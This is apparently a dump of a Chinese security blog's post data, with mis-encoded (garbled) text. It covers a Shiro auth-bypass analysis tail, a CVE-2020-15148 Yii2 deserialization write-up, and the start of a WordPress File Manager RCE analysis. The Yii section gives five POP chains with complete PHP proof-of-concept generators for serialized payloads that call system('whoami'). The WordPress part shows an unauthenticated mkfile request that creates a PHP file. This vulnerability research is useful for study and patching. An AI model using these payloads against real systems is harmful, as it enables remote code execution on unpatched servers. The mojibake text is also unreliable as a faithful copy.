é¡µé¢ï¼Œä¸åº”è¿”å›æƒé™ä¸‹çš„é¡µé¢ï¼Œè¿™ä¸ªé—®é¢˜æš‚ä¸”æ”¾ä¸‹ï¼Œç»§ç»­å‘ä¸‹åˆ†æã€‚ ç„¶åå›åˆ°å‡½æ•° org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#getHandlerInternal è·Ÿè¿› lookupHandlerMethodorg.springframework.web.servlet.handler.AbstractHandlerMethodMapping#lookupHandlerMethod è·Ÿè¿›å…¶ä¸­çš„ addMatchingMappingsorg.springframework.web.servlet.handler.AbstractHandlerMethodMapping#addMatchingMappings org.springframework.web.servlet.mvc.condition.PatternsRequestCondition#getMatchingCondition org.springframework.web.servlet.mvc.condition.PatternsRequestCondition#getMatchingPatterns æ­¤æ—¶æˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ° /admin/{name} ä¸ /admin/;whippet èƒ½å¤ŸåŒ¹é…æˆåŠŸã€‚ ä¼šè¿”å›/admin/;whippet çš„é¡µé¢ï¼Œæ­¤æ—¶çš„ name å€¼ä¸º ;wippet ï¼Œå¦‚æœä¹‹å‰æˆ‘ä»¬å¹¶æ²¡æœ‰ä¿®æ”¹ä»£ç ï¼Œè€Œæ˜¯å›ºå®šçš„é¡µé¢çš„è¯ è®¿é—® /admin/page è‡ªç„¶æ˜¯ä¸ admin/;page åŒ¹é…ä¸ä¸Šçš„ã€‚ å‚è€ƒæ–‡ç«  CVE-2020-13933: Apache Shiro æƒé™ç»•è¿‡æ¼æ´åˆ†æshiroæºç ç¯‡ - shiroçš„filterï¼Œä½ å€¼å¾—æ‹¥æœ‰ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"CVE-2020-15148 Yiiæ¡†æ¶ååºåˆ—åŒ–","slug":"CVE-2020-15148 Yiiæ¡†æ¶ååºåˆ—åŒ–","date":"2020-09-21T05:49:01.000Z","updated":"2020-10-12T06:10:55.187Z","comments":true,"path":"2020/09/21/CVE-2020-15148 Yiiæ¡†æ¶ååºåˆ—åŒ–/","link":"","permalink":"http://yoursite.com/2020/09/21/CVE-2020-15148%20Yii%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"ç¯å¢ƒæ­å»º yiiä¸‹è½½åœ°å€ å½±å“èŒƒå›´ Yii2 &lt; 2.0.38","text":"ç¯å¢ƒæ­å»º yiiä¸‹è½½åœ°å€ å½±å“èŒƒå›´ Yii2 &lt; 2.0.38 é€‰æ‹©ä¸€ä¸ªæ¼æ´å½±å“çš„ç‰ˆæœ¬ yii-basic-app-2.0.37.tgzä¸‹è½½åè§£å‹åˆ° web ç›®å½•ä¸‹ï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶ config/web.php ï¼Œç»™ cookieValidationKey å­—æ®µè®¾ç½®ä¸€ä¸ªå€¼ã€‚ ç„¶åæ·»åŠ ä¸€ä¸ªå­˜åœ¨æ¼æ´çš„ Action/controllers/TestController.php 1234567891011121314151617&lt;?phpnamespace app\\controllers;use Yii;use yii\\web\\Controller;class TestController extends Controller{ public function actionTest(){ $name = Yii::$app-&gt;request-&gt;get('unserialize'); return unserialize(base64_decode($name)); }}?&gt; æµ‹è¯•è¿è¡ŒæˆåŠŸ æ¼æ´åˆ†æ åˆ©ç”¨é“¾ 1 æŸ¥çœ‹ github çš„ commit è®°å½• å‘ç°åœ¨ /db/BatchQueryResult.php ä¸­æ–°å¢äº† __wakeup() æ–¹æ³•ï¼Œåœ¨ __wakeup() æ–¹æ³•ä¸­æŠ›å‡ºå¼‚å¸¸ã€‚ unserialize() ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª __wakeup() æ–¹æ³•ã€‚å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ __wakeup æ–¹æ³•ï¼Œé¢„å…ˆå‡†å¤‡å¯¹è±¡éœ€è¦çš„èµ„æºã€‚ åˆ©ç”¨ __wakeup() æ–¹æ³•æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸ºäº†é˜²æ­¢ BatchQueryResult ç±»è¢«ååºåˆ—åŒ–ã€‚ çŒœæµ‹ BatchQueryResult ç±»ä¸ºååºåˆ—åŒ–çš„èµ·ç‚¹ vendor/yiisoft/yii2/db/BatchQueryResult.php::__destruct 1234567891011121314151617public function __destruct(){ // make sure cursor is closed $this-&gt;reset();}public function reset(){ if ($this-&gt;_dataReader !== null) { $this-&gt;_dataReader-&gt;close(); } $this-&gt;_dataReader = null; $this-&gt;_batch = null; $this-&gt;_value = null; $this-&gt;_key = null;} __destruct ( void ) : voidææ„å‡½æ•°ä¼šåœ¨åˆ°æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…å½“å¯¹è±¡è¢«æ˜¾å¼é”€æ¯æ—¶æ‰§è¡Œã€‚ __destruct æ–¹æ³•é‡Œé¢è°ƒç”¨äº† reset æ–¹æ³•ï¼Œ reset æ–¹æ³•é‡Œé¢åˆè°ƒç”¨äº† close æ–¹æ³•ã€‚\\$this-&gt;_dataReader çš„å€¼å¯æ§ï¼Œæ‰€ä»¥å¯ä»¥å½“ä½œè·³æ¿å»æ‰§è¡Œå…¶ä»–ç±»ä¸­çš„é­”æœ¯æ–¹æ³• __call() æ–¹æ³•ã€‚ public __call ( string $name , array $arguments ) : mixedåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶ï¼Œ__call() ä¼šè¢«è°ƒç”¨ã€‚$name å‚æ•°æ˜¯è¦è°ƒç”¨çš„æ–¹æ³•åç§°ã€‚$arguments å‚æ•°æ˜¯ä¸€ä¸ªæšä¸¾æ•°ç»„ï¼ŒåŒ…å«ç€è¦ä¼ é€’ç»™æ–¹æ³• $name çš„å‚æ•°ã€‚ äº†è§£ __call() æ–¹æ³•ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œå…¨å±€æœç´¢ï¼Œæ‰¾åˆ°å…¶ä¸­ä¸åŒ…å« closeæ–¹æ³•çš„ç±»ï¼Œå°±å¯ä»¥æ‰§è¡Œè¯¥ç±»çš„__call() æ–¹æ³•ã€‚ å…¨å±€æœç´¢ function __call( vendor/fzaninotto/faker/src/Faker/Generator.php::__call 1234public function __call($method, $attributes) { return $this-&gt;format($method, $attributes); } è·Ÿè¿› format vendor/fzaninotto/faker/src/Faker/Generator.php::format 1234public function format($formatter, $arguments = array()){ return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);} format ä¸­è°ƒç”¨äº† call_user_func_array æ–¹æ³• ï¼Œ$formatter ä¸ $agruments æˆ‘ä»¬éƒ½ä¸å¯æ§ã€‚æ­¤æ—¶ $formatter = close,$agrumentsä¸ºç©ºã€‚$formatter ä¼ é€’è‡³ getFormatter()vendor/fzaninotto/faker/src/Faker/Generator.php::getFormatter 1234567891011121314public function getFormatter($formatter){ if (isset($this-&gt;formatters[$formatter])) { return $this-&gt;formatters[$formatter]; } foreach ($this-&gt;providers as $provider) { if (method_exists($provider, $formatter)) { $this-&gt;formatters[$formatter] = array($provider, $formatter); return $this-&gt;formatters[$formatter]; } } throw new \\InvalidArgumentException(sprintf('Unknown formatter \"%s\"', $formatter));} æˆ‘ä»¬æ³¨æ„åˆ°åœ¨ getFormatter æ–¹æ³•ä¸­ï¼Œ$this-&gt;formatters[$formatter] æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼ŒgetFormatter æ–¹æ³•è¿”å›å€¼æ˜¯å¯æ§çš„ã€‚é‚£ä¹ˆ call_user_func_array è¿™ä¸ªå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å¯æ§ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºç©ºã€‚æ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ yii æ¡†æ¶ä¸­çš„ä»»ä½•ä¸€ä¸ªæ— å‚çš„æ–¹æ³•äº†ã€‚ call_user_func_array ( callable $callback , array $param_arr ) : mixedæŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°ï¼ˆcallbackï¼‰è°ƒç”¨ï¼ŒæŠŠå‚æ•°æ•°ç»„ä½œï¼ˆparam_arrï¼‰ä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°ä¼ å…¥ã€‚è°ƒç”¨ç±»ä¸­çš„å…¬å…±æ–¹æ³•å¯ä»¥åˆ©ç”¨ call_user_func_array(['ç±»å','ç±»ä¸­çš„æ–¹æ³•'],[]); å…¨å±€æœç´¢ call_user_func\\(\\$this-&gt;([a-zA-Z0-9]+), \\$this-&gt;([a-zA-Z0-9]+) æ‰¾åˆ°ä½¿ç”¨ call_user_func å‡½æ•°ï¼Œä¸”å‚æ•°ä¸ºç±»ä¸­æˆå‘˜å˜é‡çš„æ‰€æœ‰æ–¹æ³•ã€‚ åˆ©ç”¨å…¶ä¸­çš„ vendor/yiisoft/yii2/rest/CreateAction.php::run 1234567public function run(){ if ($this-&gt;checkAccess) { call_user_func($this-&gt;checkAccess, $this-&gt;id); } ......} $this-&gt;checkAccess ä»¥åŠ $this-&gt;id éƒ½å¯æ§ æ‰€ä»¥åˆ©ç”¨é“¾ä¸ºï¼š yii\\db\\BatchQueryResult::__destruct()yii\\db\\BatchQueryResult::reset()Faker\\Generator::__call()Faker\\Generator::format(â€˜closeâ€™,[])call_user_func_array([â€˜new yii\\rest\\CreateActionâ€™,â€™runâ€™],[])yii\\rest\\CreateAction::run()call_user_func(â€˜systemâ€™,â€™whoamiâ€™) 12345678910$n = yii\\db\\BatchQueryResult{ $this-&gt;_dataReader = Faker\\Generator{ $this-&gt;formatters['close'] = [ yii\\rest\\CreateAction{ $this-&gt;checkAccess = 'system'; $this-&gt;id = 'whoami'; } ,'run']; }} POC 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpnamespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess = 'system'; $this-&gt;id = 'whoami'; } }}namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&gt;formatters['close'] = [new CreateAction(), 'run']; } }}namespace yii\\db{ use Faker\\Generator; class BatchQueryResult{ private $_dataReader; public function __construct(){ $this-&gt;_dataReader = new Generator; } }}namespace{ echo base64_encode(serialize(new yii\\db\\BatchQueryResult));}?&gt; åˆ©ç”¨é“¾2 BatchQueryResult ç±»ä»ä¸ºååºåˆ—åŒ–çš„èµ·ç‚¹ï¼Œä¸åˆ©ç”¨é­”æœ¯æ–¹æ³• __call()ï¼Œé€‰æ‹©å°† $this-&gt;_dataReader èµ‹å€¼ä¸ºä¸€ä¸ªå­˜åœ¨ close æ–¹æ³•çš„ç±»ï¼Œæ‰¾åˆ°è¯¥ç±»ä¸­ closeæ–¹æ³•è°ƒç”¨ä¸­å­˜åœ¨ä»£ç æ‰§è¡Œã€‚ \\yii2\\web\\DbSession::close 12345678public function close(){ if ($this-&gt;getIsActive()) { // prepare writeCallback fields before session closes $this-&gt;fields = $this-&gt;composeFields(); YII_DEBUG ? session_write_close() : @session_write_close(); }} å½“ $this-&gt;getIsActive() ä¸º true æ—¶ï¼Œåˆ™ä¼šè°ƒç”¨ $this-&gt;composeFields()è·Ÿè¿› DbSession çš„çˆ¶ç±» MultiFieldSession çš„çˆ¶ç±» Session\\yii2\\web\\Session::getIsActive 1234public function getIsActive() { return session_status() === PHP_SESSION_ACTIVE; } å½“Yiiçš„debugå’Œgiiè¿™ä¸¤ä¸ªé»˜è®¤æ‰©å±•éƒ½å­˜åœ¨ï¼ˆä¸ä¸€å®šè¦å¼€å¯ï¼‰æ—¶ï¼Œè¿™é‡Œè¿”å›trueã€‚å¦åˆ™è¿”å›falseã€‚é»˜è®¤å®‰è£…æƒ…å†µä¸‹éƒ½è¿”å›trueã€‚è·Ÿè¿› composeFields æ–¹æ³•ï¼Œåœ¨DbSession çš„çˆ¶ç±» MultiFieldSession ä¸­å®ç°\\yii\\web\\MultiFieldSession::composeFields 1234567891011protected function composeFields($id = null, $data = null){ $fields = $this-&gt;writeCallback ? call_user_func($this-&gt;writeCallback, $this) : []; if ($id !== null) { $fields['id'] = $id; } if ($data !== null) { $fields['data'] = $data; } return $fields;} å‘ç°è°ƒç”¨äº†call_user_funcå‡½æ•°ï¼Œ $this-&gt;writeCallback å¯æ§ï¼Œå…¶ä½™å‚æ•°ä¸å¯æ§ã€‚å¯ä»¥é€šè¿‡æ§åˆ¶ $this-&gt;writeCallback ä¸º [â€˜ç±»åâ€™,â€™ç±»ä¸­çš„æ–¹æ³•â€™] æ¥å®ç°è°ƒç”¨ç±»ä¸­çš„æ–¹æ³•ã€‚ å…¨å±€æœç´¢ call_user_func\\(\\$this-&gt;([a-zA-Z0-9]+) åˆ©ç”¨å…¶ä¸­çš„ \\yii\\rest\\IndexAction::run 1234567public function run(){ if ($this-&gt;checkAccess) { call_user_func($this-&gt;checkAccess, $this-&gt;id); } ......} $this-&gt;checkAccess ä»¥åŠ $this-&gt;id éƒ½å¯æ§ åˆ©ç”¨é“¾ yii\\db\\BatchQueryResult::__destruct()yii\\db\\BatchQueryResult::reset()yii\\web\\DbSession::close()yii\\web\\MultiFieldSession::composeFields()call_user_func_array([â€˜new yii\\rest\\IndexActionâ€™,â€™runâ€™],[])yii\\rest\\IndexAction::run()call_user_func(â€˜systemâ€™,â€™whoamiâ€™) POC 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace yii\\rest { class IndexAction { public $checkAccess; public $id; public function __construct() { $this-&gt;checkAccess = 'system'; $this-&gt;id = 'whoami'; } }}namespace yii\\web { use yii\\rest\\IndexAction; class DbSession { public $writeCallback; public function __construct() { $this-&gt;writeCallback = [new IndexAction(), \"run\"]; } }}namespace yii\\db { use yii\\web\\DbSession; class BatchQueryResult { private $_dataReader; public function __construct() { $this-&gt;_dataReader = new DbSession(); } }}namespace{ echo base64_encode(serialize(new yii\\db\\BatchQueryResult));} åˆ©ç”¨é“¾3 \\Codeception\\Extension\\RunProcess::__destruct 1234public function __destruct() { $this-&gt;stopProcess(); } \\Codeception\\Extension\\RunProcess::stopProcess 123456789101112public function stopProcess() { foreach (array_reverse($this-&gt;processes) as $process) { /** @var $process Process **/ if (!$process-&gt;isRunning()) { continue; } $this-&gt;output-&gt;debug('[RunProcess] Stopping ' . $process-&gt;getCommandLine()); $process-&gt;stop(); } $this-&gt;processes = []; } æ³¨æ„åˆ° RunProcess ä¸­çš„ __destruct æ–¹æ³•è°ƒç”¨äº† stopProcess() æ–¹æ³•ï¼Œ stopProcess() æ–¹æ³• ä¸­çš„ $this-&gt;processes å¯æ§ï¼Œåˆ™ $process å¯æ§ï¼Œä¸‹é¢è°ƒç”¨äº† $process-&gt;isRunning() ï¼Œåˆ™åˆå¯ä»¥åˆ©ç”¨é­”æœ¯æ–¹æ³• __call()ã€‚ åˆ©ç”¨é“¾ \\Codeception\\Extension\\RunProcess::__destruct()\\Codeception\\Extension\\RunProcess::stopProcess()Faker\\Generator::__call()Faker\\Generator::format(â€˜isRunningâ€™,[])call_user_func_array([â€˜new yii\\rest\\CreateActionâ€™,â€™runâ€™],[])yii\\rest\\CreateAction::run()call_user_func(â€˜systemâ€™,â€™whoamiâ€™) poc 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess = 'system'; $this-&gt;id = 'whoami'; } }}namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&gt;formatters['isRunning'] = [new CreateAction(), 'run']; } }}namespace Codeception\\Extension{ use Faker\\Generator; class RunProcess{ private $processes; public function __construct(){ $this-&gt;processes = [new Generator]; } }}namespace{ echo base64_encode(serialize(new Codeception\\Extension\\RunProcess));}?&gt; åˆ©ç”¨é“¾4 \\Swift_KeyCache_DiskKeyCache::__destruct 123456public function __destruct(){ foreach ($this-&gt;keys as $nsKey =&gt; $null) { $this-&gt;clearAll($nsKey); }} \\Swift_KeyCache_DiskKeyCache::clearAll 123456789101112public function clearAll($nsKey){ if (array_key_exists($nsKey, $this-&gt;keys)) { foreach ($this-&gt;keys[$nsKey] as $itemKey =&gt; $null) { $this-&gt;clearKey($nsKey, $itemKey); } if (is_dir($this-&gt;path.'/'.$nsKey)) { rmdir($this-&gt;path.'/'.$nsKey); } unset($this-&gt;keys[$nsKey]); }} å› ä¸º $nsKey $this-&gt;keys å¯æ§ï¼Œè·Ÿè¿›$this-&gt;clearKey(Â· \\Swift_KeyCache_DiskKeyCache::clearKey 1234567public function clearKey($nsKey, $itemKey){ if ($this-&gt;hasKey($nsKey, $itemKey)) { $this-&gt;freeHandle($nsKey, $itemKey); unlink($this-&gt;path.'/'.$nsKey.'/'.$itemKey); }} \\Swift_KeyCache_DiskKeyCache::hasKey 1234public function hasKey($nsKey, $itemKey){ return is_file($this-&gt;path.'/'.$nsKey.'/'.$itemKey);} $this-&gt;path å¯æ§ ï¼Œè¿›è¡Œäº†å­—ç¬¦ä¸²çš„æ‹¼æ¥æ“ä½œï¼Œå¯ä»¥åˆ©ç”¨é­”æœ¯æ–¹æ³• __toString è§¦å‘åç»­æ“ä½œã€‚ __toString() æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ ç„¶åå…¨å±€æœç´¢ __toString æ–¹æ³• \\phpDocumentor\\Reflection\\DocBlock\\Tags\\See::__toString 1234public function __toString() : string{ return $this-&gt;refers . ($this-&gt;description ? ' ' . $this-&gt;description-&gt;render() : '');} $this-&gt;description å¯æ§ï¼Œåˆ™åˆå¯ä»¥åˆ©ç”¨é­”æœ¯æ–¹æ³• __call()ã€‚ åˆ©ç”¨é“¾ \\Swift_KeyCache_DiskKeyCache::__destruct()\\Swift_KeyCache_DiskKeyCache::clearAll()\\Swift_KeyCache_DiskKeyCache::clearKey()\\Swift_KeyCache_DiskKeyCache::hasKey()\\phpDocumentor\\Reflection\\DocBlock\\Tags\\See::__toString()\\Faker\\Generator::__call()\\Faker\\Generator::format(â€˜renderâ€™,[])\\call_user_func_array([â€˜new yii\\rest\\CreateActionâ€™,â€™runâ€™],[])\\yii\\rest\\CreateAction::run()\\call_user_func(â€˜systemâ€™,â€™whoamiâ€™) POC 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?phpnamespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess = 'phpinfo'; $this-&gt;id = '1'; } }}namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&gt;formatters['render'] = [new CreateAction(), 'run']; } }}namespace phpDocumentor\\Reflection\\DocBlock\\Tags{ use Faker\\Generator; class See{ protected $description; public function __construct() { $this-&gt;description = new Generator(); } }}namespace { use phpDocumentor\\Reflection\\DocBlock\\Tags\\See; class Swift_KeyCache_DiskKeyCache { private $keys = []; private $path; public function __construct() { $this-&gt;path = new See; $this-&gt;keys = array( \"test\"=&gt;array(\"test\") ); } }}namespace{ echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));}?&gt; åˆ©ç”¨é“¾5 \\Symfony\\Component\\String\\UnicodeString::__wakeup 1234public function __wakeup(){ normalizer_is_normalized($this-&gt;string) ?: $this-&gt;string = normalizer_normalize($this-&gt;string);} __wakeup æ–¹æ³•ä¸­ è°ƒç”¨äº† normalizer_is_normalized æ–¹æ³• normalizer_is_normalized æ–¹æ³• ä¼šæŠŠå‚æ•°å½“ä½œå­—ç¬¦ä¸²è¿›è¡Œå¤„ç† ï¼Œå¹¶ä¸”$this-&gt;string å¯æ§ã€‚åªéœ€è¦å¯»æ‰¾é­”æœ¯æ–¹æ³• __toString è§¦å‘åç»­æ“ä½œã€‚ normalizer_is_normalized æ£€æŸ¥æä¾›çš„å­—ç¬¦ä¸²æ˜¯å¦å·²ç»å¤„äºæŒ‡å®šçš„è§„èŒƒåŒ–å½¢å¼ åˆ©ç”¨é“¾ \\Symfony\\Component\\String\\UnicodeString::__wakeup normalizer_is_normalized()\\phpDocumentor\\Reflection\\DocBlock\\Tags\\See::__toString()\\Faker\\Generator::__call()\\Faker\\Generator::format(â€˜renderâ€™,[])\\call_user_func_array([â€˜new yii\\rest\\CreateActionâ€™,â€™runâ€™],[])\\yii\\rest\\CreateAction::run()\\call_user_func(â€˜systemâ€™,â€™whoamiâ€™) POC 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpnamespace yii\\rest{ class CreateAction{ public $checkAccess; public $id; public function __construct(){ $this-&gt;checkAccess = 'phpinfo'; $this-&gt;id = '1'; } }}namespace Faker{ use yii\\rest\\CreateAction; class Generator{ protected $formatters; public function __construct(){ $this-&gt;formatters['render'] = [new CreateAction(), 'run']; } }}namespace phpDocumentor\\Reflection\\DocBlock\\Tags{ use Faker\\Generator; class See{ protected $description; public function __construct() { $this-&gt;description = new Generator(); } }}namespace Symfony\\Component\\String{ use phpDocumentor\\Reflection\\DocBlock\\Tags\\See; class UnicodeString { private $string; public function __construct() { $this-&gt;string = new See; } }}namespace{ echo base64_encode(serialize(new Symfony\\Component\\String\\UnicodeString()));}?&gt; åœ¨æ‰§è¡Œ system(\"whoami\") çš„å‘½ä»¤æ—¶ï¼Œä¼šæŠ¥é”™ yii è§†å›¾æŠ¥é”™å¯¼è‡´æ— æ³•å›æ˜¾å‘½ä»¤æ‰§è¡Œçš„ç»“æœï¼Œæ‰§è¡Œå…¶ä»–å‘½ä»¤å³å¯ã€‚ å¯èƒ½è¿˜ä¼šé‡åˆ°å¤§ä½¬è¯´çš„è¿™ä¸ªé—®é¢˜ PREG_UNMATCHED_AS_NULL ï¼ŒREG_UNMATCHED_AS_NULL è¿™ä¸ªé™æ€å˜é‡å­˜åœ¨äº php7.2 ç‰ˆæœ¬ä»¥ä¸Šï¼Œæ›´æ¢ php ç‰ˆæœ¬å°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ æˆ‘é€‰æ‹© php7.3.4 æ—¶åˆ©ç”¨æˆåŠŸï¼Œé€‰æ‹© php7.0.9 è™½æ²¡åˆ©ç”¨æˆåŠŸï¼Œä½†æ²¡æœ‰è¯¦ç»†çš„æŠ¥é”™ä¿¡æ¯ã€‚ å‚è€ƒæ–‡ç«  CVE-2020-15148 Yii2ååºåˆ—åŒ–RCE POPé“¾åˆ†ææˆ‘æ˜¯æ€ä¹ˆæŒ–æ˜yii2ååºåˆ—åŒ–0dayçš„yii2ååºåˆ—åŒ–åç»­æ€æ ·æŒ–æ˜å‡ºå±äºè‡ªå·±çš„phpååºåˆ—åŒ–é“¾ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Wordpress file manageræ’ä»¶å‘½ä»¤æ‰§è¡Œ","slug":"Wordpress file manageræ’ä»¶å‘½ä»¤æ‰§è¡Œ","date":"2020-09-10T02:50:32.000Z","updated":"2020-10-12T06:10:55.190Z","comments":true,"path":"2020/09/10/Wordpress file manageræ’ä»¶å‘½ä»¤æ‰§è¡Œ/","link":"","permalink":"http://yoursite.com/2020/09/10/Wordpress%20file%20manager%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","excerpt":"ps: é¦–å‘åœ¨äº‘ä¼—å¯ä¿¡çš„sec-inå¹³å°ï¼šsec-in.com ç¯å¢ƒæ­å»º åˆ©ç”¨ phpstudy æ­å»º wordpress ï¼Œhttp://wordpress.test/wp-admin/plugin-install.php å°†è§£å‹ä¸€æ¬¡åçš„æ¼æ´æ’ä»¶å‹ç¼©åŒ…ä¸Šä¼ å¹¶å¯ç”¨æ’ä»¶ã€‚ File Manageræ’ä»¶6.0ç‰ˆæœ¬","text":"ps: é¦–å‘åœ¨äº‘ä¼—å¯ä¿¡çš„sec-inå¹³å°ï¼šsec-in.com ç¯å¢ƒæ­å»º åˆ©ç”¨ phpstudy æ­å»º wordpress ï¼Œhttp://wordpress.test/wp-admin/plugin-install.php å°†è§£å‹ä¸€æ¬¡åçš„æ¼æ´æ’ä»¶å‹ç¼©åŒ…ä¸Šä¼ å¹¶å¯ç”¨æ’ä»¶ã€‚ File Manageræ’ä»¶6.0ç‰ˆæœ¬ æ¼æ´åˆ©ç”¨ è¿™æ®µä»£ç æ¥è‡ª elFinder é¡¹ç›®ï¼Œè¿™æ˜¯ä¸€ä¸ªå‘ Web åº”ç”¨ç¨‹åºæä¾›æ–‡ä»¶æµè§ˆå™¨ GUI çš„æ¡†æ¶ã€‚è¿™ä¸ªéå¸¸å…·ä½“çš„ä»£ç ä»…ä½œä¸ºç¤ºä¾‹ï¼Œè€Œä¸èƒ½åœ¨ç”Ÿäº§åº”ç”¨ç¨‹åºä¸­ç›´æ¥ä½¿ç”¨ã€‚ä½†æ˜¯ï¼Œæ­£å¦‚æˆ‘ä»¬æ‰€çœ‹åˆ°çš„ï¼Œä½¿ç”¨äº†å®ƒï¼Œç»“æœæ˜¯å¯ä»¥æ‰§è¡Œè¿™éƒ¨åˆ†ä»£ç è€Œæ— éœ€è¿›è¡Œèº«ä»½éªŒè¯ã€‚ åœ¨ exp-db æœç´¢ elFinder ä¸‹è½½ä¸‹æ¥çš„æ¼æ´åˆ©ç”¨æ–‡ä»¶éœ€è¦ä¿®æ”¹éƒ¨åˆ† æ¼æ´åˆ†æ å‘é€ä¸€ä¸ªè¿™æ ·çš„ payload æ¥è¿›è¡Œåˆ›å»ºæ–‡ä»¶çš„æ“ä½œ http://wordpress.test/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php?cmd=mkfile&amp;name=test.php&amp;target=l1_Lw æ¼æ´è§¦å‘ä½ç½® /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php é€šè¿‡åˆ›å»º elFinderConnector å¯¹è±¡ï¼Œè¿›è€Œè°ƒç”¨ elFinderConnector.run è¯»å–æ‰€æœ‰çš„è¯·æ±‚å‚æ•°ä¿å­˜åˆ° $src ä¸­ï¼Œ $cmd è·å– cmd å˜é‡ã€‚\\elFinderConnector::run æ¥ç€æ‰§è¡Œåˆ°å¾ªç¯ foreach ($this-&gt;elFinder-&gt;commandArgsList($cmd) as $name =&gt; $req) { å¯¹ $cmd è¿›è¡Œæ ¡éªŒ è·Ÿè¿›å‡½æ•°commandArgsList\\elFinder::commandArgsList \\elFinder::commandExists é€šè¿‡åˆ¤æ–­ $cmd ï¼Œåœ¨ $this-&gt;commands[$cmd] ä¸­å‘ç°äº†å¯ä»¥è°ƒç”¨çš„æ–¹æ³•\\elFinder::$commands ç»§ç»­æ‰§è¡Œï¼Œå‘ç° $this-&gt;output($this-&gt;elFinder-&gt;exec($cmd, $args)); \\elFinder::exec æ§åˆ¶ $cmd = makedile æ—¶, ä¸ºæ»¡è¶³æ¡ä»¶ç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œéœ€è¦ä¼ å…¥ $target æˆ–è€… $dstã€‚ $this-&gt;volume($dst) æ ¹æ®ä¼ å…¥çš„ $dst å‰ç¼€è¿›è¡Œé€‰æ‹© l1_ æˆ–è€… t1_ æˆ‘ä»¬åœ¨åé¢è¿›è¡Œè°ƒè¯•æ—¶ä¼šå‘ç°ç”Ÿæˆæ–‡ä»¶çš„ä½ç½®å‰ç¼€ä¸ºæ‰€å¯¹åº”çš„ root çš„å€¼ ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è¿™é‡Œé€‰æ‹© l1_\\elFinder::volume ç»§ç»­æ‰§è¡Œåˆ°åŠ¨æ€è°ƒç”¨ï¼Œé€šè¿‡ $result = $this-&gt;$cmd($args); è°ƒç”¨makefileæ–¹æ³•ã€‚\\elFinderVolumeDriver::mkfile $path = $this-&gt;decode($dst); \\elFinderVolumeDriver::decodedecode å‡½æ•° å…ˆå°†$hash çš„å€¼æ ¹æ® $this-&gt;id è¿›è¡Œåˆ†å‰²ï¼Œç„¶åæ›¿æ¢å­—ä¸²å¹¶è¿›è¡Œ base64 è§£ç  ç„¶åæ‹¼æ¥ æ‰€å¯¹åº”çš„ $this-&gt;root è¿”å›$path = E:\\Tools\\phpstudy_pro\\WWW\\wordpress\\wp-content\\plugins\\wp-file-manager\\lib\\filesç»§ç»­å›åˆ° mkfile å‡½æ•°ä¸­æ‰§è¡Œ \\elFinderVolumeLocalFileSystem::_mkfile æœ€åé¡ºåˆ©ç”Ÿæˆæ–‡ä»¶åœ¨ E:\\Tools\\phpstudy_pro\\WWW\\wordpress\\wp-content\\plugins\\wp-file-manager\\lib\\files\\test.phpå¯¹äºç½‘ç«™çš„ä½ç½®å°±æ˜¯ \\wp-content\\plugins\\wp-file-manager\\lib\\files\\test.php ç„¶åå†è°ƒç”¨ PUT æ–¹æ³•ï¼Œä¼ å€¼åˆ° mkfile 